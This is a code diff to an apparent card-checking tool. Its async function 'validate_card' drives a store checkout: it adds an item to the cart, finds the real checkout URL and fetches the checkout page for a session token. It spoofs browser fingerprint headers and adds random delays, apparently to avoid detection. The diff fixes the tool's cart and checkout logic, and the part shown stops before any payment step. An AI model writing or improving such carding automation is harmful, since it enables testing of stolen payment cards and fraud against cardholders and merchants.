@@ -1031,8 +1031,13 @@ async def validate_card(
                     base_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
                     base_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
 
-                # 1. Add to cart
+                # 1. Add to cart (Fixed logic to actually read JSON response)
                 cart_added = False
+                cart_headers = {
+                    **base_headers, 
+                    "X-Requested-With": "XMLHttpRequest",
+                    "Accept": "application/json"
+                }
                 for payload, ct in [
                     (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
                     (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), "application/json"),
@@ -1041,10 +1046,11 @@ async def validate_card(
                         r = await session.post(
                             f"{ourl}/cart/add.js",
                             data=payload,
-                            headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
+                            headers={**cart_headers, "Content-Type": ct},
                         )
                         if r.status_code in (200, 201):
                             res_json = orjson.loads(r.content)
+                            # Check if 'items' or 'id' is in the response
                             if "items" in res_json or "id" in res_json:
                                 cart_added = True
                                 break
@@ -1060,16 +1066,29 @@ async def validate_card(
 
                 await asyncio.sleep(random.uniform(0.15, 0.35))
 
-                # 2. Get Checkout page
+                # 2. Get Checkout page (Use GET /cart first to find the real checkout URL)
                 try:
-                    cr = await session.post(
-                        f"{ourl}/checkout/",
-                        allow_redirects=True,
-                        headers={**base_headers,
-                                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
-                    )
-                    checkout_url = str(cr.url)
-                    page_text    = cr.text
+                    cart_resp = await session.get(f"{ourl}/cart", allow_redirects=True, headers=base_headers)
+                    cart_text = cart_resp.text
+                    
+                    m = re.search(r'"checkout_url"\s*:\s*"([^"]+)"', cart_text)
+                    if m:
+                        checkout_url = m.group(1).replace('\\/', '/')
+                        if not checkout_url.startswith('http'):
+                            checkout_url = f"https://{hostname}{checkout_url}"
+                    else:
+                        # Fallback to direct POST if checkout_url is not found in cart page
+                        cr = await session.post(
+                            f"{ourl}/checkout/",
+                            allow_redirects=True,
+                            headers={**base_headers, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
+                        )
+                        checkout_url = str(cr.url)
+                    
+                    # Now GET the checkout page to get the session token
+                    cr = await session.get(checkout_url, allow_redirects=True, headers=base_headers)
+                    page_text = cr.text
+                    
                 except (asyncio.TimeoutError, RequestsError):
                     if outer_attempt < max_retries - 1:
                         await asyncio.sleep(0.5)
